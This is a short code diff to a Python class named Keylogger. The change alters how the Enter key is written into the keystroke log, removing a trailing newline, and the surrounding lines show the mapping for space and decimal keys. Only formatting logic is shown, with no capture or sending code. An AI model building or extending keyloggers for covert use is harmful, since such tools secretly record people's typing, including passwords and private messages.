@@ -23,7 +23,7 @@ class Keylogger:
             if name == 'space':
                 name = ' '
             elif name == 'enter':
-                name = '[ENTER]\n'
+                name = '[ENTER]'
             elif name == 'decimal':
                 name = '.'
             else:
